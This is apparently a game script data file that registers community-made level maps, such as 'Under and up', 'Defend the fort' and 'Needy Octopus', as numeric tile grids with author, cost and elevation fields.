maps.push({name="Under and up",author="Luffaren",id="#1677443253",direction="forward",cost=223,elevation=19,map=[0,0,0,0,0,0,5,5,2,2,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,24,100,9998,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,89,5,24,24,5,89,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,185,185,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,185,185,5,5,5,5,0,0,0,0,0,0,0,0,0,0,141,141,141,5,185,185,5,141,141,141,0,0,0,0,0,0,0,0,0,0,14,14,14,14,185,185,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,89,14,185,185,14,89,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,185,185,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,67,14,14,185,185,14,14,67,0,0,0,0,0,0,0,0,0,0,0,0,67,14,14,185,185,14,14,67,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,185,185,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,89,14,185,185,14,89,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,185,185,14,14,14,14,0,0,0,0,0,0,0,0,0,0,141,141,141,14,185,185,14,141,141,141,0,0,0,0,0,0,0,0,0,0,24,24,24,90,24,24,90,24,24,24,0,0,0,0,0,0,0,0,0,0,24,24,89,24,24,24,24,89,24,24,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,24,89,2,2,89,24,0,0,0,0,0,0,0,0]});
maps.push({name="Enter the depths",author="Luffaren",id="#1677445449",direction="forward",cost=544,elevation=9,map=[20,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,2,2,5,20,20,19,18,17,16,15,14,13,12,11,10,9,8,7,6,5,5,5,5,20,20,21,22,23,24,24,94,13,12,11,10,9,8,7,6,5,5,94,5,1,93,24,24,24,24,24,24,1,1,1,1,1,1,1,1,1,1,1,1,1,24,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,114,1,1,24,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,114,1,1,24,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,114,1,1,24,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,114,1,1,24,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,185,114,1,1,1,114,114,24,24,24,24,24,24,24,24,24,24,185,185,185,185,114,1,1,1,95,95,1,1,1,1,1,96,96,1,1,24,185,185,185,185,114,1,1,1,114,114,95,114,89,114,1,24,24,1,1,24,185,185,185,185,114,1,1,1,89,114,95,114,114,114,1,23,23,1,1,24,185,185,185,185,114,1,1,1,1,1,1,1,95,95,1,22,22,1,1,24,185,185,185,185,114,1,1,89,114,114,95,114,114,114,1,21,21,1,1,24,185,185,185,185,114,1,1,114,89,114,95,114,89,114,1,20,20,1,1,24,185,185,185,185,114,1,1,114,114,114,95,114,114,114,1,19,19,1,1,97,24,114,114,114,114,1,1,95,95,95,1,1,1,91,1,18,18,1,1,1,1,95,95,95,1,1,1,114,114,114,1,93,114,114,1,18,18,17,16,15,14,14,14,14,1,1,1,1,2,2,1,1,1,1,1,18,18,17,16,15,14,14,89,14,1,1]});
maps.push({name="Get over here",author="Luffaren",id="#1677447370",direction="forward",cost=418,elevation=-13,map=[90,2,2,90,24,24,24,0,0,0,0,0,77,24,24,24,24,24,24,24,24,24,24,24,58,58,24,1,77,0,0,0,77,24,89,118,118,118,118,24,24,58,58,58,89,58,24,1,77,0,0,0,77,24,118,118,89,118,118,24,24,58,89,58,58,58,24,1,0,0,0,0,0,24,89,118,24,117,117,24,24,58,58,58,58,58,95,118,38,38,38,38,38,95,118,118,24,116,116,24,24,58,58,24,58,58,95,118,38,38,38,38,38,95,118,118,24,115,115,24,24,95,95,24,24,24,24,1,0,0,0,0,0,24,91,91,24,114,114,24,24,58,58,58,58,58,24,1,77,0,0,0,77,24,91,118,24,113,113,24,24,58,89,58,89,58,24,1,77,0,0,0,77,24,118,93,24,112,112,24,24,58,58,58,58,58,24,0,0,0,0,0,77,24,93,118,24,111,111,24,24,24,24,24,95,95,24,67,0,0,0,0,0,24,24,24,24,95,95,24,24,58,58,95,58,58,24,67,0,0,0,0,0,0,0,11,90,11,11,90,24,89,58,95,58,58,24,67,0,0,0,0,0,0,67,161,65,11,11,11,24,58,58,24,24,24,24,67,0,0,0,0,0,0,67,161,65,11,89,11,24,58,58,24,94,94,24,67,0,0,0,0,0,0,67,161,65,11,11,11,24,95,95,24,24,24,24,67,0,0,0,0,0,0,67,161,65,11,11,89,24,58,58,24,24,24,24,67,0,0,0,0,0,0,67,161,65,11,11,11,24,58,89,58,18,141,24,67,0,0,0,0,0,0,67,161,65,11,89,11,24,58,58,58,18,18,24,67,0,0,0,0,0,0,67,161,65,11,11,11,24,24,24,24,24,24,24,67,0,0,0,0,0,0,0,11,11,2,2,11]});
maps.push({name="Rafters",author="Luffaren",id="#1677449437",direction="forward",cost=212,elevation=-6,map=[1,1,1,1,1,1,1,14,14,2,2,14,14,1,1,1,1,1,1,1,24,24,23,22,22,22,1,3,9998,14,14,9998,3,1,22,22,22,23,24,24,24,24,0,0,0,0,1,8,8,8,8,8,8,1,0,0,0,0,24,24,93,100,0,0,0,41,1,48,48,48,48,48,48,1,41,0,0,0,100,93,0,0,0,0,0,0,1,8,8,8,8,8,8,1,0,0,0,0,0,0,0,0,0,0,0,40,1,48,48,48,48,48,48,1,40,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,8,8,1,0,0,0,0,0,0,0,0,0,0,0,39,1,48,48,48,48,48,48,1,39,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,8,8,1,0,0,0,0,0,0,0,0,0,0,0,38,1,48,48,48,48,48,48,1,38,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,8,8,1,0,0,0,0,0,0,0,0,0,0,0,37,1,48,48,48,48,48,48,1,37,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,8,8,1,0,0,0,0,0,0,0,0,0,0,0,36,1,48,48,48,48,48,48,1,36,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,8,8,1,0,0,0,0,0,0,0,0,0,0,0,35,1,48,48,48,48,48,48,1,35,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,8,8,1,0,0,0,0,0,0,0,0,0,0,0,34,114,48,48,48,48,48,48,114,34,0,0,0,0,0,0,0,0,0,0,0,1,8,8,8,8,8,8,1,0,0,0,0,0,0,0,0,0,0,0,0,1,94,8,2,2,8,94,1,0,0,0,0,0,0]});
maps.push({name="Many things",author="NyaaaDoge",id="#1677496284",direction="forward",cost=353,elevation=0,map=[145,157,0,0,0,0,0,0,14,2,2,162,160,0,0,0,0,0,0,0,5,153,0,1,1,1,1,97,14,14,14,0,160,0,162,162,162,162,160,0,154,0,1,94,70,127,14,96,14,144,14,0,160,0,159,0,0,0,160,0,0,0,77,183,146,135,9998,195,14,14,14,0,162,162,159,0,160,161,161,0,0,0,87,183,146,135,9998,195,14,14,14,3,0,0,164,0,160,0,0,0,0,0,67,183,146,135,9998,195,34,34,34,0,0,0,0,0,162,162,160,0,0,0,1,93,80,14,89,91,34,34,34,0,0,0,0,0,0,0,160,0,0,0,0,1,1,1,1,1,34,199,34,0,0,0,0,0,160,161,161,0,0,0,0,0,0,0,0,0,34,34,34,0,0,0,158,0,160,0,0,0,0,0,0,0,0,0,0,85,34,34,34,0,0,0,159,0,162,162,160,0,1,100,24,4,17,141,143,14,54,54,54,0,0,0,159,0,0,0,160,0,0,1,1,1,1,1,1,1,54,54,54,0,0,0,159,161,161,161,161,0,0,0,0,189,0,0,0,147,54,132,54,0,0,0,0,0,0,0,0,0,1,100,90,24,92,75,14,131,54,54,54,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,54,54,54,1,0,0,0,0,0,0,0,0,0,0,189,0,0,0,76,95,114,114,114,1,0,0,0,0,0,0,0,0,1,100,24,130,130,130,140,95,114,114,114,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,95,114,90,114,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,114,114,114,1,0,0,0,0,0,0,0,0,1,100,66,69,69,68,66,142,114,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="Air Strafe or Crouch",author="NyaaaDoge",id="#1677507334",direction="forward",cost=195,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,0,19,133,0,0,0,0,0,0,0,100,133,100,0,0,0,0,0,9,9,0,188,0,0,0,0,0,0,0,0,96,42,42,0,0,0,0,0,9,9,0,0,0,0,0,0,187,30,131,0,96,96,96,0,0,128,29,90,9,9,90,0,0,0,0,0,0,0,0,0,96,137,42,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,42,42,42,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,9,9,0,189,0,0,0,0,0,0,0,1,0,0,0,32,32,32,0,0,9,9,0,39,126,0,0,0,0,0,36,125,0,32,32,32,132,32,0,0,95,95,0,0,0,0,0,0,0,0,188,1,0,0,0,32,32,32,0,0,9,9,0,0,0,0,1,0,0,0,0,1,1,0,1,0,0,0,0,0,9,9,0,0,0,1,127,1,0,0,1,136,93,42,93,0,0,0,0,0,9,9,0,0,0,0,42,0,0,0,1,90,42,93,90,0,0,0,0,97,9,9,90,0,0,0,188,0,0,0,0,1,0,0,0,0,0,0,0,0,9,9,0,0,0,0,0,0,187,30,131,0,0,0,0,0,0,128,9,9,9,9,0,0,0,39,39,39,187,30,131,0,0,0,0,0,0,128,9,9,9,9,0,0,0,39,134,39,0,0,0,0,65,65,0,0,0,0,0,0,9,9,0,0,0,39,9998,39,3,5,5,5,5,5,5,6,7,8,8,9,9,9,9,0,0,0,136,23,186,0,0,0,0,0,0,0,0,0,0,9,2,2,9]});
maps.push({name="The great divider",author="Luffaren",id="#1677515429",direction="left",cost=245,elevation=-19,map=[1,1,1,1,24,24,2,2,24,1,1,1,0,0,0,0,0,0,0,0,1,142,124,96,24,24,24,24,89,1,1,0,0,0,0,0,0,0,0,0,1,124,1,1,24,24,24,24,24,1,0,0,0,0,0,0,0,0,0,0,1,143,1,1,23,23,23,23,23,23,0,0,0,0,0,0,0,0,0,0,5,65,5,6,1,22,22,22,22,22,22,0,0,0,0,0,0,0,0,0,5,5,5,6,7,1,21,21,21,21,21,21,0,0,0,0,0,0,0,0,2,5,5,6,7,8,1,20,20,20,20,20,20,0,0,0,0,0,0,0,2,5,5,6,7,8,9,1,19,19,19,19,19,19,0,0,0,0,0,0,5,89,5,6,7,8,9,10,1,18,18,18,18,18,18,0,0,0,0,0,1,1,1,6,7,8,9,10,11,1,17,17,17,17,17,17,0,0,0,0,1,1,0,0,7,8,9,10,11,12,1,16,16,16,16,16,16,0,0,0,1,0,0,0,0,8,9,10,11,12,13,1,15,15,15,15,15,15,0,0,0,0,0,0,0,0,9,10,11,12,13,14,1,14,14,14,14,14,14,0,0,0,0,0,0,0,0,10,11,12,13,14,14,1,90,89,14,14,14,14,0,0,0,0,0,0,0,0,11,12,13,14,14,90,1,14,14,14,89,14,0,0,0,0,0,0,0,0,0,12,13,14,14,89,14,114,14,89,14,14,0,0,0,0,0,0,0,0,0,0,13,14,14,14,14,14,114,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,89,14,114,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,89,14,14,14,1,90,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,90,1]});
maps.push({name="Defend the fort",author="Luffaren",id="#1677518900",direction="left",cost=467,elevation=-19,map=[199,0,2,2,0,199,0,1,1,1,1,1,1,1,1,1,1,1,1,1,199,0,44,44,0,199,0,1,132,1,132,1,132,1,132,1,132,1,132,1,199,0,131,131,0,199,0,1,105,1,105,1,105,1,105,1,105,1,105,1,199,199,199,199,199,199,0,1,143,1,143,1,143,1,143,1,143,1,143,1,0,0,0,0,0,199,0,5,5,5,5,5,5,5,5,5,5,5,5,5,89,5,5,5,0,199,0,161,161,65,65,5,94,5,94,5,65,65,162,162,2,5,5,5,0,199,0,161,65,65,5,5,5,5,5,5,5,65,65,162,2,5,5,89,0,199,0,161,65,5,5,5,5,9998,5,5,5,5,65,162,5,5,5,5,0,199,0,161,5,5,89,5,9998,133,9998,5,89,5,5,162,89,5,89,5,0,199,0,5,5,5,5,5,5,17,5,5,5,5,5,5,5,5,5,5,0,199,0,5,5,141,5,5,9998,96,9998,5,5,141,5,5,5,89,5,89,0,199,0,5,14,12,14,14,22,17,22,14,14,12,14,5,5,5,5,5,0,199,0,5,9998,46,46,141,12,16,12,46,95,46,9998,5,5,5,5,5,0,199,0,5,14,95,12,9998,13,15,13,95,12,46,14,5,5,5,5,5,0,199,0,5,14,46,9998,133,14,14,14,46,12,95,14,5,5,134,134,5,0,199,0,5,12,95,12,46,96,46,97,46,12,46,12,5,5,9,9,5,0,199,0,5,14,46,12,12,12,12,12,12,12,95,14,5,5,5,128,5,0,199,0,5,12,46,95,46,95,46,95,46,95,46,12,5,0,0,0,0,0,199,0,5,14,12,14,12,14,12,14,12,14,12,14,5,199,199,199,199,199,199,0,93,5,5,5,5,5,4,5,5,5,5,5,93]});
maps.push({name="Speed lane best lane",author="Luffaren",id="#1677521010",direction="left",cost=374,elevation=-19,map=[5,5,65,65,65,162,162,67,0,0,0,0,0,0,24,2,2,24,24,24,2,5,65,65,65,162,162,67,0,0,0,0,0,0,24,24,24,24,160,24,2,5,65,65,65,162,162,67,0,0,0,0,0,0,24,24,24,24,160,24,5,5,65,65,65,162,162,67,0,0,0,0,0,0,24,24,24,24,160,24,5,5,65,65,65,162,162,67,0,0,0,0,0,0,0,24,24,24,160,24,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,24,24,160,24,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,24,24,160,24,14,159,14,14,0,0,0,0,0,0,0,0,0,0,0,0,23,23,67,23,14,67,14,14,0,0,0,0,0,0,0,0,0,0,0,0,23,23,160,23,15,159,15,15,0,0,0,0,0,0,0,0,0,0,0,0,23,23,160,23,15,159,15,15,0,0,0,0,0,0,0,0,0,0,0,0,22,22,67,22,15,67,15,15,0,0,0,0,0,0,0,0,0,0,0,0,22,22,160,22,16,159,16,16,0,0,0,0,0,0,0,0,0,0,0,0,22,22,160,22,16,159,16,16,0,0,0,0,0,0,0,0,0,0,0,0,21,21,67,21,16,67,16,16,0,0,0,0,0,0,0,0,0,0,0,0,21,21,160,21,17,159,17,17,0,0,0,0,0,0,0,0,0,0,0,0,21,21,160,21,17,159,17,17,17,17,18,18,18,19,19,19,20,20,20,21,21,21,160,21,17,159,17,17,17,17,18,18,18,19,19,19,20,20,20,21,21,21,160,21,17,159,161,161,161,67,161,161,67,161,161,67,161,161,67,161,161,161,161,21,17,17,17,17,17,17,18,18,18,19,19,19,20,20,20,21,21,21,21,21]});
maps.push({name="Let us in",author="Luffaren",id="#1677594744",direction="left",cost=595,elevation=-19,map=[1,1,1,1,1,1,90,5,5,5,5,5,5,5,24,24,24,24,2,2,2,105,100,143,105,96,5,5,5,5,5,5,5,90,24,89,24,24,24,24,2,105,105,143,105,96,5,94,5,94,5,94,5,3,24,24,1,1,24,24,1,97,105,131,24,24,90,5,5,5,5,5,5,3,24,24,1,1,24,24,1,105,132,24,89,24,5,5,5,5,5,5,5,90,24,89,24,24,89,24,1,1,1,24,24,24,5,5,5,5,5,5,5,5,24,24,24,24,24,24,67,65,5,185,185,5,93,5,5,5,5,5,5,5,5,185,185,5,65,67,67,65,5,185,185,5,5,65,160,160,160,160,65,5,5,185,185,5,65,67,67,65,5,185,185,5,5,162,67,67,67,67,161,5,5,185,185,5,65,67,67,65,5,185,185,5,5,162,67,0,0,67,161,5,5,185,185,5,65,67,67,65,5,185,185,5,5,162,67,0,0,67,161,5,5,185,185,5,65,67,67,65,5,185,185,5,5,162,67,67,67,67,161,5,5,185,185,5,65,67,67,65,5,185,185,5,5,65,159,159,159,159,65,5,5,185,185,5,65,67,67,65,5,185,185,5,93,5,5,5,5,5,5,93,5,185,185,5,65,67,24,24,24,24,24,24,5,5,5,5,5,5,5,5,24,24,24,24,24,24,22,24,24,24,89,24,185,185,185,185,185,185,185,185,24,89,24,24,24,22,20,22,1,1,24,24,185,185,185,185,185,185,185,185,24,24,1,1,22,20,18,20,1,1,24,24,5,5,5,5,5,5,5,5,24,24,1,1,20,18,16,18,20,22,24,24,65,65,65,65,65,65,65,65,24,24,22,20,18,16,100,16,18,20,22,24,67,67,67,67,67,67,67,67,24,22,20,18,16,100]});
maps.push({name="Corrupted Sanctum",author="ZpLit",id="#1678056559",direction="forward",cost=836,elevation=0,map=[0,0,0,0,0,0,14,14,14,2,2,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,165,165,165,165,165,165,165,165,14,14,0,0,0,0,0,0,0,14,165,165,165,165,165,165,165,165,165,165,165,165,14,0,0,0,0,0,14,167,165,165,165,75,75,75,75,75,75,165,165,165,166,14,0,0,0,14,167,167,165,75,75,75,1,75,75,1,75,75,75,165,166,166,14,0,0,14,167,167,75,75,75,90,75,94,94,75,90,75,75,75,166,166,14,0,14,167,167,167,75,75,75,75,75,75,75,75,75,75,75,75,75,166,166,14,14,167,167,75,75,75,75,75,75,75,75,75,75,75,75,75,75,166,166,14,14,167,167,75,75,90,75,75,75,1,1,75,75,75,90,75,75,166,166,14,14,167,167,75,75,75,75,75,1,1,1,1,75,75,75,75,75,166,166,14,14,167,167,75,75,75,75,75,1,1,1,1,75,75,75,75,75,166,166,14,14,167,167,75,75,90,75,75,75,1,1,75,75,75,90,75,75,166,166,14,14,167,167,75,75,75,75,75,75,75,75,75,75,75,75,75,75,166,166,14,14,167,167,167,75,75,75,75,75,75,75,75,75,75,75,75,75,166,166,14,0,14,167,167,75,75,75,90,75,93,93,75,90,75,75,75,166,166,14,0,0,14,167,167,164,75,75,75,1,75,75,1,75,75,75,164,166,166,14,0,0,0,14,167,164,164,164,75,75,75,75,75,75,164,164,164,166,14,0,0,0,0,0,14,164,164,164,164,164,164,164,164,164,164,164,164,14,0,0,0,0,0,0,0,14,14,164,164,164,164,164,164,164,164,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,2,2,14,14,14,0,0,0,0,0,0]});
maps.push({name="Two ways",author="xDarkCein",id="#1679450046",direction="forward",cost=432,elevation=12,map=[0,131,93,97,0,0,199,5,2,2,94,5,199,24,133,99,24,199,0,0,0,24,24,24,102,0,199,5,5,5,5,5,199,199,101,101,101,199,0,0,0,3,3,3,0,0,1,141,5,5,3,5,1,0,24,24,24,0,0,0,0,0,0,0,0,0,1,17,1,1,17,17,1,0,184,89,184,0,0,0,0,0,0,0,1,1,1,66,1,1,17,89,1,0,184,24,184,0,0,0,0,0,0,0,1,69,69,69,69,69,66,17,1,1,16,4,16,199,0,0,0,126,18,126,1,69,1,1,1,1,142,142,1,16,16,16,16,16,199,0,0,0,174,0,1,69,1,1,1,1,142,142,1,16,66,66,66,16,199,0,0,0,0,0,1,66,17,17,17,94,17,17,1,16,66,66,66,16,199,0,0,143,143,143,17,1,1,1,91,91,91,1,1,16,16,66,16,129,0,19,0,0,0,0,0,0,0,1,91,91,91,1,0,1,1,69,1,0,0,0,0,0,0,0,0,0,1,17,83,82,84,17,1,0,1,69,1,0,0,0,19,147,147,147,147,0,1,132,17,17,17,17,1,0,1,69,1,0,0,19,0,0,0,0,1,1,1,17,17,89,17,17,1,1,1,69,1,0,0,0,0,0,0,0,1,19,0,17,17,17,17,17,66,69,69,69,1,0,0,0,0,0,0,0,1,127,199,96,96,96,96,1,1,1,1,1,1,0,0,20,0,0,0,0,0,0,199,96,96,96,96,199,0,199,199,199,0,0,0,127,0,0,168,0,0,0,199,98,98,98,98,199,0,199,93,24,0,0,0,98,0,0,173,19,19,19,199,98,98,98,98,199,0,199,133,24,0,0,0,0,0,0,1,1,1,1,1,94,2,2,134,199,199,199,93,24,130,130,130,21]});
maps.push({name="One by One",author="TheOtherNormie28",id="#1680102996",direction="left",cost=431,elevation=-3,map=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,1,1,30,30,30,30,31,32,33,33,95,33,33,33,33,33,33,33,33,33,1,1,30,30,30,30,31,32,33,33,95,33,33,33,33,33,33,33,33,33,1,1,30,30,1,1,1,1,1,1,1,1,1,1,1,1,33,33,33,33,1,1,30,30,1,1,1,1,1,1,1,1,1,1,1,33,33,33,33,33,1,1,30,30,1,1,33,33,33,33,33,33,33,33,33,33,33,1,33,33,1,1,30,30,1,1,33,33,33,33,33,33,33,33,33,33,1,1,33,33,1,1,30,30,1,1,96,96,1,1,1,1,1,1,1,1,1,1,33,33,1,1,30,30,1,1,33,33,1,1,1,1,1,1,1,1,1,1,33,33,1,1,30,30,1,1,33,33,33,33,33,33,33,33,33,33,1,1,33,33,1,1,30,30,1,1,33,33,33,33,33,33,33,33,33,33,1,1,33,33,1,1,30,30,1,1,1,1,1,1,1,1,1,1,33,33,1,1,33,33,1,1,30,30,1,1,1,1,1,1,1,1,1,1,33,33,1,1,33,33,1,1,97,30,1,1,31,31,32,33,33,33,33,33,33,33,1,1,32,32,1,1,96,96,1,30,30,31,32,33,33,33,33,33,33,33,1,1,31,31,1,1,30,30,98,99,30,1,1,1,1,1,1,1,1,1,1,1,30,30,1,1,30,30,30,98,1,1,1,1,1,1,1,1,1,1,1,1,30,30,1,2,101,30,30,101,30,30,30,30,30,30,30,30,30,30,30,98,30,30,1,2,101,30,30,101,102,30,30,30,30,30,30,30,30,30,30,98,30,30,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Needy Octopus",author="IV",id="#1680552681",direction="forward",cost=289,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,124,124,122,1,0,0,0,1,1,1,0,0,0,0,0,1,1,1,124,124,124,122,1,0,0,0,0,1,94,93,1,0,0,1,1,124,124,124,124,124,122,1,122,1,0,0,0,1,94,93,124,1,1,124,5,5,148,124,124,122,122,122,122,1,0,0,0,0,1,124,101,124,124,5,66,66,5,124,124,122,122,124,122,1,0,38,38,0,0,1,124,124,124,5,24,102,5,124,124,124,124,122,1,0,38,0,0,38,1,124,124,124,24,149,5,5,124,124,124,124,122,1,0,0,38,0,0,38,1,124,124,24,24,24,124,124,124,124,124,124,122,1,0,0,38,0,0,38,1,124,24,24,24,24,124,124,124,124,124,124,122,1,0,0,38,0,0,38,1,124,24,24,24,24,124,124,124,124,124,124,122,1,0,0,38,0,0,38,1,124,124,24,24,24,124,124,124,124,124,124,122,1,0,0,38,0,0,38,1,124,124,124,24,149,5,5,124,124,124,124,122,1,0,0,0,38,38,0,0,1,124,124,124,5,66,66,5,124,124,124,124,122,1,0,0,0,0,0,1,124,103,124,124,5,24,104,5,124,124,122,122,124,122,1,0,0,0,1,94,93,124,1,1,124,5,5,148,124,124,122,122,122,122,1,0,0,0,1,94,93,1,0,0,1,1,124,124,124,124,124,122,1,122,1,0,0,0,1,1,1,0,0,0,0,0,1,1,1,124,124,124,122,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,124,124,122,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,100,2,2,1]});
maps.push({name="AXE",author="IV",id="#1680920240",direction="forward",cost=601,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,5,0,0,0,0,0,0,0,0,78,78,78,78,78,0,0,0,5,5,5,5,5,0,0,0,0,0,0,5,5,5,5,5,5,5,0,5,5,5,5,5,5,5,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,5,5,78,78,1,1,78,78,76,1,1,1,1,1,1,0,0,0,0,5,5,78,78,78,78,1,40,40,78,76,78,78,78,78,76,1,0,0,5,5,76,76,78,78,78,1,1,40,78,78,78,78,78,1,78,78,1,0,5,76,76,76,76,78,78,78,1,78,78,1,78,78,1,76,78,78,1,5,5,76,76,76,76,78,78,78,78,78,78,76,1,78,1,76,78,1,1,5,5,76,76,76,76,78,78,78,78,78,78,76,1,78,1,76,1,1,1,5,5,76,76,76,76,78,78,78,78,78,78,76,1,78,1,76,1,1,1,5,5,76,76,76,76,78,78,78,78,78,78,76,1,78,1,76,78,1,1,0,5,76,76,76,76,78,78,78,1,78,78,1,78,78,1,76,78,78,1,0,5,5,76,76,78,78,78,1,1,40,78,78,78,78,78,1,78,78,1,0,0,5,5,78,78,78,78,1,40,40,78,76,78,78,78,78,76,1,0,0,0,0,5,5,78,78,1,1,78,78,76,1,1,1,1,1,1,1,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,5,5,5,5,5,5,5,0,5,5,5,5,5,5,5,0,0,0,0,0,0,78,78,78,78,78,0,0,0,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,5,0,0]});
maps.push({name="Dongdong",author="Dongdong",id="#1681552656",direction="left",cost=311,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(8,26,55),Vector(8,26,55),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),0,0,0,Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),0,0,Vector(98,102,139),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(98,102,139),Vector(232,204,203),Vector(232,204,203),Vector(98,102,139),Vector(98,102,139),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),0,Vector(98,102,139),0,0,Vector(98,102,139),0,0,Vector(98,102,139),Vector(98,102,139),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(98,102,139),Vector(232,204,203),Vector(232,204,203),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),0,0,Vector(98,102,139),Vector(98,102,139),0,0,0,Vector(8,26,55),Vector(241,237,245),Vector(8,26,55),Vector(65,64,96),Vector(98,102,139),Vector(232,204,203),Vector(232,204,203),Vector(8,26,55),Vector(179,216,243),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),Vector(93,100,134),0,0,0,Vector(8,26,55),Vector(8,26,55),Vector(8,26,55),Vector(65,64,96),Vector(65,64,96),Vector(232,204,203),Vector(232,204,203),Vector(8,26,55),Vector(179,216,243),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(98,102,139),Vector(98,102,139),2,0,Vector(8,26,55),Vector(8,26,55),Vector(8,26,55),Vector(8,26,55),Vector(65,64,96),Vector(65,64,96),Vector(232,204,203),Vector(232,204,203),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(199,200,214),Vector(199,200,214),2,0,Vector(8,26,55),Vector(8,26,55),Vector(8,26,55),Vector(8,26,55),Vector(98,102,139),Vector(65,64,96),Vector(232,204,203),Vector(232,204,203),Vector(98,102,139),Vector(98,102,139),Vector(241,237,245),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(199,200,214),Vector(8,26,55),0,Vector(8,26,55),Vector(8,26,55),Vector(8,26,55),Vector(8,26,55),Vector(98,102,139),Vector(98,102,139),Vector(232,204,203),Vector(232,204,203),Vector(98,102,139),Vector(241,237,245),Vector(64,59,72),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(199,200,214),Vector(8,26,55),Vector(8,26,55),Vector(8,26,55),Vector(8,26,55),Vector(8,26,55),Vector(8,26,55),Vector(98,102,139),Vector(98,102,139),Vector(232,204,203),Vector(232,204,203),Vector(241,237,245),Vector(241,237,245),Vector(64,59,72),Vector(64,59,72),Vector(241,237,245),Vector(98,102,139),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(199,200,214),0,Vector(8,26,55),Vector(8,26,55),Vector(8,26,55),Vector(8,26,55),Vector(98,102,139),Vector(98,102,139),Vector(65,64,96),Vector(232,204,203),Vector(232,204,203),Vector(98,102,139),Vector(241,237,245),Vector(64,59,72),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(199,200,214),0,0,Vector(8,26,55),Vector(8,26,55),Vector(98,102,139),Vector(98,102,139),Vector(65,64,96),Vector(65,64,96),Vector(232,204,203),Vector(232,204,203),Vector(98,102,139),Vector(98,102,139),Vector(239,233,242),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(241,237,245),Vector(241,237,245),Vector(98,102,139),Vector(199,200,214),0,Vector(8,26,55),Vector(8,26,55),Vector(98,102,139),Vector(98,102,139),Vector(65,64,96),Vector(65,64,96),Vector(65,64,96),Vector(232,204,203),Vector(232,204,203),Vector(241,237,245),Vector(241,237,245),Vector(243,236,241),Vector(241,237,245),V